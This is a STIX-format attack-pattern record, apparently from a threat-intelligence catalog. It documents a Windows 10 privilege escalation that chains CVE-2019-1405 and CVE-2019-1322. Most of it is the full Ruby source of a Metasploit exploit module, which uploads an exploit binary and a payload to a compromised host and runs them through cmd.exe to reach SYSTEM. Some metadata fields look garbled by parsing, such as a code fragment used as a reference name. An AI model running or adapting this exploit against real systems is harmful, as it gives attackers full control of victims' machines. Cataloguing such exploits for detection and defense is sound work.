{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--1fd54f06-6666-4e8f-8899-af2c994aaaed",
    "created": "2024-08-14T16:50:09.130035Z",
    "modified": "2024-08-14T16:50:09.130039Z",
    "name": "Microsoft UPnP Local Privilege Elevation Vulnerability",
    "description": " This exploit uses two vulnerabilities to execute a command as an elevated user.",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/local/comahawk.rb",
            "external_id": "comahawk.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2019-1322"
        },
        {
            "source_name": "CVE",
            "external_id": "2019-1405"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/apt69/COMahawk"
        },
        {
            "source_name": "reference",
            "url": "https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2019/november/cve-2019-1405-and-cve-2019-1322-elevation-to-system-via-the-upnp-device-host-service-and-the-update-orchestrator-service/"
        },
        {
            "source_name": "reference",
            "url": "https://fortiguard.com/threat-signal-report/3243/new-proof-of-concept-combining-cve-2019-1322-and-cve-2019-1405-developed-1"
        },
        {
            "source_name": "exploit_bin=exploit_data(cve-2019-1322",
            "external_id": "CVE-2019-1322-EXE.exe)"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ExcellentRanking\n\n  include Msf::Post::Common\n  include Msf::Post::File\n  include Msf::Post::Windows::Priv\n  include Msf::Exploit::EXE\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Microsoft UPnP Local Privilege Elevation Vulnerability',\n        'Description' => %q{\n          This exploit uses two vulnerabilities to execute a command as an elevated user.\n          The first (CVE-2019-1405) uses the UPnP Device Host Service to elevate to\n          NT AUTHORITY\\LOCAL SERVICE\n          The second (CVE-2019-1322) leverages the Update Orchestrator Service to\n          elevate from NT AUTHORITY\\LOCAL SERVICE to NT AUTHORITY\\SYSTEM.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'NCC Group', # Original discovery (https://www.nccgroup.trust/uk/)\n          'hoangprod',            # PoC\n          'bwatters-r7'           # msf module\n        ],\n        'Platform' => ['win'],\n        'SessionTypes' => ['meterpreter'],\n        'Targets' => [\n          ['Windows x64', { 'Arch' => ARCH_X64 }]\n        ],\n        'DefaultTarget' => 0,\n        'DisclosureDate' => '2019-11-12',\n        'References' => [\n          ['CVE', '2019-1322'],\n          ['CVE', '2019-1405'],\n          ['EDB', '47684'],\n          ['URL', 'https://github.com/apt69/COMahawk'],\n          ['URL', 'https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2019/november/cve-2019-1405-and-cve-2019-1322-elevation-to-system-via-the-upnp-device-host-service-and-the-update-orchestrator-service/'],\n          ['URL', 'https://fortiguard.com/threat-signal-report/3243/new-proof-of-concept-combining-cve-2019-1322-and-cve-2019-1405-developed-1']\n        ],\n        'DefaultOptions' => {\n          'DisablePayloadHandler' => false\n        },\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_sys_config_getenv\n            ]\n          }\n        }\n      )\n    )\n\n    register_options([\n      OptString.new('EXPLOIT_NAME',\n                    [false, 'The filename to use for the exploit binary (%RAND% by default).', nil]),\n      OptString.new('PAYLOAD_NAME',\n                    [false, 'The filename for the payload to be used on the target host (%RAND%.exe by default).', nil]),\n      OptString.new('WRITABLE_DIR',\n                    [false, 'Path to write binaries (%TEMP% by default).', nil]),\n      OptInt.new('EXPLOIT_TIMEOUT',\n                 [true, 'The number of seconds to wait for exploit to finish running', 60]),\n      OptInt.new('EXECUTE_DELAY',\n                 [true, 'The number of seconds to delay between file upload and exploit launch', 3])\n    ])\n  end\n\n  def exploit\n    exploit_name = datastore['EXPLOIT_NAME'] || Rex::Text.rand_text_alpha(6..14)\n    payload_name = datastore['PAYLOAD_NAME'] || Rex::Text.rand_text_alpha(6..14)\n    exploit_name = \"#{exploit_name}.exe\" unless exploit_name.end_with?('.exe')\n    payload_name = \"#{payload_name}.exe\" unless payload_name.end_with?('.exe')\n    temp_path = datastore['WRITABLE_DIR'] || session.sys.config.getenv('TEMP')\n    payload_path = \"#{temp_path}\\\\#{payload_name}\"\n    exploit_path = \"#{temp_path}\\\\#{exploit_name}\"\n    payload_exe = generate_payload_exe\n\n    # Check target\n    vprint_status('Checking Target')\n    validate_active_host\n    validate_target\n    fail_with(Failure::BadConfig, \"#{temp_path} does not exist on the target\") unless directory?(temp_path)\n\n    # Upload Exploit\n    vprint_status(\"Uploading exploit to #{sysinfo['Computer']} as #{exploit_path}\")\n    ensure_clean_destination(exploit_path)\n    exploit_bin = exploit_data('cve-2019-1322', 'CVE-2019-1322-EXE.exe')\n    write_file(exploit_path, exploit_bin)\n    print_status(\"Exploit uploaded on #{sysinfo['Computer']} to #{exploit_path}\")\n\n    # Upload Payload\n    vprint_status('Uploading Payload')\n    ensure_clean_destination(payload_path)\n    write_file(payload_path, payload_exe)\n    print_status(\"Payload (#{payload_exe.length} bytes) uploaded on #{sysinfo['Computer']} to #{payload_path}\")\n    print_warning(\"This exploit requires manual cleanup of the payload #{payload_path}\")\n\n    # Run Exploit\n    vprint_status('Running Exploit')\n    print_status('It may take a moment after the session is established for the exploit to exit safely.')\n    begin\n      cmd_exec('cmd.exe', \"/c #{exploit_path} #{payload_path}\", 60)\n    rescue Rex::TimeoutError => e\n      elog('Caught timeout.  Exploit may be taking longer or it may have failed.', error: e)\n      print_error('Caught timeout.  Exploit may be taking longer or it may have failed.')\n    end\n    vprint_status(\"Cleaning up #{exploit_path}\")\n    ensure_clean_destination(exploit_path)\n  end\n\n  def validate_active_host\n    print_status(\"Attempting to PrivEsc on #{sysinfo['Computer']} via session ID: #{datastore['SESSION']}\")\n  rescue Rex::Post::Meterpreter::RequestError => e\n    elog('Could not connect to session', error: e)\n    raise Msf::Exploit::Failed, 'Could not connect to session'\n  end\n\n  def validate_target\n    if sysinfo['Architecture'] == ARCH_X86\n      fail_with(Failure::NoTarget, 'Exploit code is 64-bit only')\n    end\n    version = get_version_info\n    vprint_status(\"OS version: #{version}\")\n    unless version.build_number.between?(Msf::WindowsVersion::Win10_1803, Msf::WindowsVersion::Win10_1809)\n      fail_with(Failure::NotVulnerable, 'The exploit only supports Windows 10 build versions 17133-18362')\n    end\n  end\n\n  def ensure_clean_destination(path)\n    return unless file?(path)\n\n    print_status(\"#{path} already exists on the target. Deleting...\")\n    begin\n      file_rm(path)\n      print_status(\"Deleted #{path}\")\n    rescue Rex::Post::Meterpreter::RequestError => e\n      elog(e)\n      print_error(\"Unable to delete #{path}\")\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2019-11-12",
    "x_mitre_platforms": [
        "['win']"
    ]
}